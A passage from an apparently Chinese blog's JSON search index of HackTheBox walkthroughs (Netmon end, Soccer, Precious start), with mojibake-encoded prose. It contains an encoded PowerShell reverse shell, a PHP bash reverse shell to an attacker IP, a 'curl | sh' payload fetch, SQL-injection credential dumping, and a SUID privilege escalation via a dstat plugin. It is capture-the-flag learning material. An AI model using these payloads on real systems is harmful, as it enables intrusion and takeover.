ARQB4AHAAcgBlAHMAcwBpAG8AbgAgAC0AQwBvAG0AbQBhAG4AZAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0AVwBhAHIAbgBpAG4AZwAgACIAUwBvAG0AZQB0AGgAaQBuAGcAIAB3AGUAbgB0ACAAdwByAG8AbgBnACAAdwBpAHQAaAAgAGUAeABlAGMAdQB0AGkAbwBuACAAbwBmACAAYwBvAG0AbQBhAG4AZAAgAG8AbgAgAHQAaABlACAAdABhAHIAZwBlAHQALgAiACAACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEUAcgByAG8AcgAgACQAXwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAJwBQAFMAIAAnACAAKwAgACgARwBlAHQALQBMAG8AYwBhAHQAaQBvAG4AKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAeAAgAD0AIAAoACQAZQByAHIAbwByAFsAMABdACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZQByAHIAbwByAC4AYwBsAGUAYQByACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAMgAgACsAIAAkAHgACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAUgBlAHQAdQByAG4AIAB0AGgAZQAgAHIAZQBzAHUAbAB0AHMACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQAgACAACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAbABpAHMAdABlAG4AZQByACkACgAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkACgAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAfQAKACAAIAAgACAAYwBhAHQAYwBoAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAFcAYQByAG4AaQBuAGcAIAAiAFMAbwBtAGUAdABoAGkAbgBnACAAdwBlAG4AdAAgAHcAcgBvAG4AZwAhACAAQwBoAGUAYwBrACAAaQBmACAAdABoAGUAIABzAGUAcgB2AGUAcgAgAGkAcwAgAHIAZQBhAGMAaABhAGIAbABlACAAYQBuAGQAIAB5AG8AdQAgAGEAcgBlACAAdQBzAGkAbgBnACAAdABoAGUAIABjAG8AcgByAGUAYwB0ACAAcABvAHIAdAAuACIAIAAKACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBFAHIAcgBvAHIAIAAkAF8ACgAgACAAIAAgAH0ACgB9AAoACgBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAAIAAtAFIAZQB2AGUAcgBzAGUAIAAtAEkAUABBAGQAZAByAGUAcwBzACAAMQAwAC4AMQAwAC4AMQA2AC4AMgAgAC0AUABvAHIAdAAgADQANAA0ADQACgA=\n```\n\n![](Hackthebox-Netmon/PvqacKVWUcCZ3xa4OZjrljuRjM63PJHY7sMiwJ2Gv4s.png)\n\n![](Hackthebox-Netmon/milOlDsKye0YuuU4dar3MND_jc7Y44EwTISp5BKwnow.png)\n\nç„¶åç‚¹å‡»å³è¾¹çš„å°é“ƒé“›è¿è¡Œ\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[/opt/nishang]\nâ””â”€# nc -nvlp 4444                                        \nlistening on [any] 4444 ...\nconnect to [10.10.16.2] from (UNKNOWN) [10.10.10.152] 51165\nWindows PowerShell running as user NETMON$ on NETMON\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Windows\\system32>whoami\nnt authority\\system\n```\n\næˆåŠŸæ‹¿åˆ° system æƒé™\n\n```bash\nPS C:\\users\\administrator\\desktop> cat root.txt\ne8d8f9949c60a0501831df4efa8613bc\n```\n\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Soccer - Hackthebox","url":"/2022/12/17/Hackthebox/Easy/Hackthebox-Soccer/","content":"\n# Hackthebox - Soccer\n# é¶åœºä¿¡æ¯\n![image](Hackthebox-Soccer/NdsJq-qlcev_gCLGnIBqUmczNDehH9bn3EV9uZBS7ms.png)\n\n# é¶åœºç±»å‹\n![image](Hackthebox-Soccer/NKOV9jOxU2U7YXq-Uooq4eze9eYtmiHglWnxsGN9gDg.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.194\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-21 01:38 EST\nNmap scan report for 10.10.11.194\nHost is up (0.28s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE         VERSION\n22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)\n|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)\n|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)\n80/tcp   open  http            nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://soccer.htb/\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n9091/tcp open  xmltec-xmlmail?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: \n|     HTTP/1.1 400 Bad Request\n|     Connection: close\n|   GetRequest: \n|     HTTP/1.1 404 Not Found\n|     Content-Security-Policy: default-src 'none'\n|     X-Content-Type-Options: nosniff\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 139\n|     Date: Wed, 21 Dec 2022 06:39:07 GMT\n|     Connection: close\n|     <!DOCTYPE html>\n|     <html lang=\"en\">\n|     <head>\n|     <meta charset=\"utf-8\">\n|     <title>Error</title>\n|     </head>\n|     <body>\n|     <pre>Cannot GET /</pre>\n|     </body>\n|     </html>\n|   HTTPOptions: \n|     HTTP/1.1 404 Not Found\n|     Content-Security-Policy: default-src 'none'\n|     X-Content-Type-Options: nosniff\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 143\n|     Date: Wed, 21 Dec 2022 06:39:07 GMT\n|     Connection: close\n|     <!DOCTYPE html>\n|     <html lang=\"en\">\n|     <head>\n|     <meta charset=\"utf-8\">\n|     <title>Error</title>\n|     </head>\n|     <body>\n|     <pre>Cannot OPTIONS /</pre>\n|     </body>\n|     </html>\n|   RTSPRequest: \n|     HTTP/1.1 404 Not Found\n|     Content-Security-Policy: default-src 'none'\n|     X-Content-Type-Options: nosniff\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 143\n|     Date: Wed, 21 Dec 2022 06:39:08 GMT\n|     Connection: close\n|     <!DOCTYPE html>\n|     <html lang=\"en\">\n|     <head>\n|     <meta charset=\"utf-8\">\n|     <title>Error</title>\n|     </head>\n|     <body>\n|     <pre>Cannot OPTIONS /</pre>\n|     </body>\n|_    </html>\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port9091-TCP:V=7.93%I=7%D=12/21%Time=63A2AA05%P=x86_64-pc-linux-gnu%r(i\nSF:nformix,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\\nSF:r\\n\\r\\n\")%r(drda,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\\nSF:x20close\\r\\n\\r\\n\")%r(GetRequest,168,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\nSF:\\nContent-Security-Policy:\\x20default-src\\x20'none'\\r\\nX-Content-Type-O\nSF:ptions:\\x20nosniff\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nC\nSF:ontent-Length:\\x20139\\r\\nDate:\\x20Wed,\\x2021\\x20Dec\\x202022\\x2006:39:07\nSF:\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html\\x20lan\nSF:g=\\\"en\\\">\\n<head>\\n<meta\\x20charset=\\\"utf-8\\\">\\n<title>Error</title>\\n<\nSF:/head>\\n<body>\\n<pre>Cannot\\x20GET\\x20/</pre>\\n</body>\\n</html>\\n\")%r(H\nSF:TTPOptions,16C,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Po\nSF:licy:\\x20default-src\\x20'none'\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\\nSF:nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\nSF:\\r\\nDate:\\x20Wed,\\x2021\\x20Dec\\x202022\\x2006:39:07\\x20GMT\\r\\nConnection\nSF::\\x20close\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html\\x20lang=\\\"en\\\">\\n<head>\\n<m\nSF:eta\\x20charset=\\\"utf-8\\\">\\n<title>Error</title>\\n</head>\\n<body>\\n<pre>\nSF:Cannot\\x20OPTIONS\\x20/</pre>\\n</body>\\n</html>\\n\")%r(RTSPRequest,16C,\"H\nSF:TTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Policy:\\x20default-\nSF:src\\x20'none'\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nContent-Type:\\x2\nSF:0text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\r\\nDate:\\x20Wed,\nSF:\\x2021\\x20Dec\\x202022\\x2006:39:08\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\\nSF:n<!DOCTYPE\\x20html>\\n<html\\x20lang=\\\"en\\\">\\n<head>\\n<meta\\x20charset=\\\"\nSF:utf-8\\\">\\n<title>Error</title>\\n</head>\\n<body>\\n<pre>Cannot\\x20OPTIONS\nSF:\\x20/</pre>\\n</body>\\n</html>\\n\")%r(RPCCheck,2F,\"HTTP/1\\.1\\x20400\\x20Ba\nSF:d\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(DNSVersionBindReqTCP,2\nSF:F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")\nSF:%r(DNSStatusRequestTCP,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnec\nSF:tion:\\x20close\\r\\n\\r\\n\")%r(Help,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\\nSF:r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(SSLSessionReq,2F,\"HTTP/1\\.1\\x20400\\\nSF:x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=12/21%OT=22%CT=1%CU=36450%PV=Y%DS=2%DC=T%G=Y%TM=63A2AA\nOS:34%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST\nOS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC\nOS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT       ADDRESS\n1   279.48 ms 10.10.14.1\n2   280.06 ms 10.10.11.194\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 68.40 seconds\n```\n## Http\n![image](Hackthebox-Soccer/em2pH6JAc_kBsenGVW7JL_3pl4xxQs0b2ui01Yc9uK4.png)\n\n80 ç«¯å£ä¼šè·³è½¬åˆ°åŸŸå soccer.htbï¼ŒåŠ å…¥ hosts è§£æ\n\n```bash\necho 10.10.11.194 soccer.htb >> /etc/hosts\n```\n![image](Hackthebox-Soccer/6ZTLKBThn3pqxuz7Z5ntUU386abNmGyQTA56QC-TRTw.png)\n\nè¿™æ˜¯ä¸€ä¸ªè¶³çƒä¿±ä¹éƒ¨ï¼Œé¦–é¡µé¢æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå…ˆåšä¸ªä¿¡æ¯æ”¶é›†å§\n\n```Plain Text\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://soccer.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://soccer.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\n                        [Status: 200, Size: 6917, Words: 2196, Lines: 148, Duration: 278ms]\ntiny                    [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 282ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 141 req/sec :: Duration: [0:03:43] :: Errors: 2 ::\n```\næ‰¾åˆ°ä¸ªæ–‡ä»¶å¤¹\n\n![image](Hackthebox-Soccer/LpSVXGrCpqXDt-qLch3WGEeypao2PbqQBK99UF00Rbg.png)\n\næ˜¯ä¸€ä¸ªç™»é™†é¡µé¢\n\n# æ¼æ´åˆ©ç”¨\næœç´¢åˆ°äº†ä¸¤ä¸ªé»˜è®¤å¯†ç \n\n```Plain Text\nusername = admin\npassword = admin@123\n\nusername = user\npassword = 12345\n```\n![image](Hackthebox-Soccer/OiHXWlpZ_RXCexycn5Ol9CP_kRZIu125CgiLKqyx7xE.png)\n\nå¾—åˆ°äº†ç‰ˆæœ¬ 2.4.3 å»æ‰¾ä¸€ä¸‹æ¼æ´\n\n![image](Hackthebox-Soccer/sa-ILWhXEaN6GPhK9nqN_eezYBK49DOXeQx4koKNhH0.png)\n\n\n\nåœ¨ç½‘ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ pocï¼Œä½†æ€ä¹ˆéƒ½æ— æ³•æ‰§è¡ŒæˆåŠŸ\n\n![image](Hackthebox-Soccer/ksjsat0sX9V54RF97YJygR8IBWNc_sDLQnxVwg7gwok.png)\n\næˆ‘ä»¬å» uploads æ–‡ä»¶å¤¹ä¸­è‡ªå·±å°è¯•ä¸Šä¼ è¯•è¯•\n\n```php\n<?php\n    system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'\")\n?>\n```\nä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n![image](Hackthebox-Soccer/q0mdrFIF5uJZBaKA73aVI6C3rRsqpH-IASzyuQedKRE.png)\n\nå¯ä»¥çœ‹åˆ°å·²ç»ä¼ ä¸Šå»äº†ï¼Œç‚¹å‡» open æ‰“å¼€æˆ‘ä»¬çš„è„šæœ¬\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                       \nlistening on [any] 4444 ...\nconnect to [10.10.14.11] from (UNKNOWN) [10.10.11.194] 37056\nbash: cannot set terminal process group (1039): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@soccer:~/html/tiny/uploads$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸå¾—åˆ°ä¸€ä¸ª shell\n\n# æƒé™æå‡\n## User\né¦–å…ˆå»è·‘ä¸€ä¸ª linpea\n\n```bash\ncurl -L http://10.10.14.11/linpeas.sh|sh\n```\n```bash\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Network Information â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                                                                                                \n                              â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                                                                                                                              \nâ•”â•â•â•â•â•â•â•â•â•â•â•£ Hostname, hosts and DNS\nsoccer                                                                                                                                                                                                             \n127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb\n\n127.0.1.1       ubuntu-focal    ubuntu-focal\n```\nçœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªå­åŸŸåï¼Œæˆ‘ä»¬ä¹Ÿå»åŠ å…¥ hosts è§£æ\n\n```bash\necho 10.10.11.194 soc-player.soccer.htb >> /etc/hosts\n```\n![image](Hackthebox-Soccer/0Sagg59nUSl4JYtMD7_tS3DC_Oz3bvOZLB3R_w68gyU.png)\n\nè¿™æ¬¡å°±è¦å¤šä¸€äº›åŠŸèƒ½äº†\n\nå…ˆå»éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·å§\n\n![image](Hackthebox-Soccer/j7zmdLsftD8ips2cI7PqnXfbS1sxXmcnWytcGACBdrw.png)\n\nç™»å…¥åå°åè²Œä¼¼æ˜¯ä¸€ä¸ªéªŒç¥¨çš„åŠŸèƒ½\n\n```bash\n        var ws = new WebSocket(\"ws://soc-player.soccer.htb:9091\");\n        window.onload = function () {\n```\nåœ¨æºä»£ç ä¸­å‘ç°äº†è¿™ä¸ªï¼Œè¿™é‡Œåº”è¯¥æ˜¯éœ€è¦åˆ©ç”¨ ws äº†\n\n> [https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)\n\n> æ‰¾åˆ°äº†ä¸€ç¯‡å‚è€ƒæ–‡ç« \n\nä½¿ç”¨é‡Œé¢é‚£ä¸ªè„šæœ¬ï¼Œç„¶åæŠŠç¬¬å…­è¡Œåˆšæ”¹ä¸ºâ€œws://soc-player.soccer.htb:9091â€\n\nç¬¬åäº”è¡Œçš„å†…å®¹æ”¹ä¸ºâ€œdata = '{\"id\":\"%s\"}' % messageâ€\n\nç„¶åè¿è¡Œ\n\n```python\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# python3 sql.py\n[+] Starting MiddleWare Server\n[+] Send payloads in http://localhost:8081/?id=*\n```\nç„¶åä½¿ç”¨ sqlmap è·‘å°±è¡Œäº†\n\n```python\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# sqlmap -u \"http://localhost:8081/?id=1\" --batch -D soccer_db -T accounts -C username,password --dump\n\nDatabase: soccer_db\nTable: accounts\n[2 entries]\n+----------+----------------------+\n| username | password             |\n+----------+----------------------+\n| player   | PlayerOftheMatch2022 |\n+----------+----------------------+\n```\nç„¶åä½¿ç”¨ ssh è¿›è¡Œç™»é™†\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ssh player@10.10.11.194                        \nplayer@10.10.11.194's password: \nWelcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Wed Dec 21 09:22:10 UTC 2022\n\n  System load:  0.01              Processes:             229\n  Usage of /:   70.0% of 3.84GB   Users logged in:       0\n  Memory usage: 25%               IPv4 address for eth0: 10.10.11.194\n  Swap usage:   0%\n\n\n0 updates can be applied immediately.\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nLast login: Tue Dec 13 07:29:10 2022 from 10.10.14.19\nplayer@soccer:~$ whoami&&id\nplayer\nuid=1001(player) gid=1001(player) groups=1001(player)\n```\næˆåŠŸæ‹¿åˆ° user æƒé™\n\n```bash\nplayer@soccer:~$ cat user.txt \nd7452b954047ec61d79b73ddbaeb6302\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n## Root\n```bash\nplayer@soccer:~$ find / -perm -4000 2>/dev/null\n/usr/local/bin/doas\n/usr/lib/snapd/snap-confine\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/eject/dmcrypt-get-device\n/usr/bin/umount\n/usr/bin/fusermount\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/chfn\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/gpasswd\n/usr/bin/chsh\n/usr/bin/at\n/snap/snapd/17883/usr/lib/snapd/snap-confine\n/snap/core20/1695/usr/bin/chfn\n/snap/core20/1695/usr/bin/chsh\n/snap/core20/1695/usr/bin/gpasswd\n/snap/core20/1695/usr/bin/mount\n/snap/core20/1695/usr/bin/newgrp\n/snap/core20/1695/usr/bin/passwd\n/snap/core20/1695/usr/bin/su\n/snap/core20/1695/usr/bin/sudo\n/snap/core20/1695/usr/bin/umount\n/snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core20/1695/usr/lib/openssh/ssh-keysign\n```\nå¯»æ‰¾ SUID äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ª /usr/local/bin/doasï¼Œæˆ‘ä»¬è¿›å…¥è·¯å¾„ /usr/local/\n\nåœ¨è·¯å¾„ /usr/local/ ä¸­ï¼Œé™¤äº† /bin/doas æˆ‘ä»¬è¿˜èƒ½çœ‹åˆ° /etc/doas.conf\n\n```bash\nplayer@soccer:/usr/local/etc$ cat doas.conf \npermit nopass player as root cmd /usr/bin/dstat\n```\nå®ƒå‘Šè¯‰æˆ‘ä»¬ï¼Œå…è®¸æˆ‘ä»¬ä»¥ root æƒé™è¿è¡Œ /usr/bin/dstat æ–‡ä»¶\n\n```bash\nplayer@soccer:/usr/local/share$ ls -la\ntotal 24\ndrwxr-xr-x  6 root root   4096 Nov 17 09:16 .\ndrwxr-xr-x 10 root root   4096 Nov 15 21:38 ..\ndrwxr-xr-x  2 root root   4096 Nov 15 21:39 ca-certificates\ndrwxrwx---  2 root player 4096 Dec 12 14:53 dstat\ndrwxrwsr-x  2 root staff  4096 Nov 17 08:06 fonts\ndrwxr-xr-x  5 root root   4096 Nov 17 09:09 man\n```\næˆ‘ä»¬åœ¨å­˜å‚¨æ’ä»¶çš„ share/dstat/ ç›®å½•ä¸­æœ‰å†™å…¥æƒé™\n\né‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åˆ›å»ºä¸€ä¸ªè¿”å› bash suid çš„ python æ–‡ä»¶å¹¶å°†å…¶ä½œä¸ºæ’ä»¶è¿è¡Œ\n\n```bash\ncd /usr/local/share/dstat\necho 'import os;os.system(\"chmod u+s /bin/bash\")' > dstat_privesc.py\ndoas -u root /usr/bin/dstat --privesc &>/dev/null\n```\nç„¶åæŸ¥çœ‹ /bin/bash æ–‡ä»¶çš„æƒé™å³å¯çœ‹åˆ°å·²ç»æˆåŠŸåˆ©ç”¨ä¸Šäº†\n\n```bash\nls -l /bin/bash\n```\nç„¶åä½¿ç”¨ /bin/bash -p è¿›è¡Œææƒ\n\n```bash\nplayer@soccer:/usr/local/share/dstat$ /bin/bash -p\nbash-5.0# whoami&&id\nroot\nuid=1001(player) gid=1001(player) euid=0(root) groups=1001(player)\n```\næˆåŠŸæ‹¿åˆ° root è´¦æˆ·æƒé™\n\n```bash\nbash-5.0# cat /root/root.txt\n1bb7d214069e85a0b01582a7399b7a0b\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Precious - Hackthebox","url":"/2022/11/26/Hackthebox/Easy/Hackthebox-Precious/","content":"\n# Hackthebox - Precious\n# é¶åœºä¿¡æ¯\n![image](Hackthebox-Precious/SXO6XJBr5ubR5mDW_Tg1EF7_AvGQ7AN6uk36u2mK6U0.png)\n\n# é¶åœºç±»å‹\n![image](Hackthebox-Precious/7qptmzhy7gnR3SulQNc5wXHHdbX5mAXwTIdg_y_YUHg.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.11.189\nStarting Nmap 7.93 ( https://nmap.org ) at 2022-12-31 20:35 EST\nNmap scan report for 10.10.11.189\nHost is up (0.26s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 845e13a8e31e20661d235550f63047d2 (RSA)\n|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)\n|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)\n80/tcp open  http    nginx 1.18.0\n|_http-title: Did not follow redirect to http://precious.htb/\n|_http-server-header: nginx/1.18.0\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=12/31%OT=22%CT=1%CU=35049%PV=Y%DS=2%DC=T%G=Y%TM=63B0E3\nOS:93%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST\nOS:11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC\nOS:N(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; 